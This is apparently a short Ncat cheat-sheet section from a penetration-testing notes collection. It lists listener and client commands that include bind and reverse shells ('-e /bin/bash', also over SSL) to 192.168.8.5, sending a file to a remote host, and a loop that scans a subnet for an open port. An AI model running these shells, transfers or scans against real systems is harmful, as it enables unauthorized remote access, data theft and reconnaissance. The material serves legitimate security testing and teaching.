### Ncat

[Server] Set up a listener:

```fundamental

ncat -nvlp 9000

ncat -nvlp 9000 > received_data.txt

ncat -nvlp 9000 -e /bin/bash

ncat -nvlp 9000 -e /bin/bash --ssl

ncat -nvlp 9000 --ssl-cert crt.pem --ssl-key key.pem

ncat -nvlp 9000 --keep-open <<< "HTTP/1.1 200 OK\r\n\r\n"

```

[Client] Connect to a remote host:

```fundamental

ncat -nv 192.168.8.5 9000

ncat -nv 192.168.8.5 9000 < sent_data.txt

ncat -nv 192.168.8.5 9000 -e /bin/bash

ncat -nv 192.168.8.5 9000 -e /bin/bash --ssl

ncat -nv 192.168.8.5 9000 --ssl-cert crt.pem --ssl-key key.pem

```

Check if it is possible to connect to a specified TCP port (e.g. port 22 or 23):

```bash

for i in {0..255}; do ncat -nv "192.168.8.${i}" 9000 -w 2 -z 2>&1 | grep -Po '(?<=Connected\ to\ )[^\s]+(?=\.)'; done

for ip in $(cat ips.txt); do ncat -nv "${ip}" 9000 -w 2 -z 2>&1 | grep -Po '(?<=Connected\ to\ )[^\s]+(?=\.)'; done

```

Find out how to create an SSL/TLS certificate from my other [project](https://github.com/ivan-sincek/secure-website/tree/master/crt).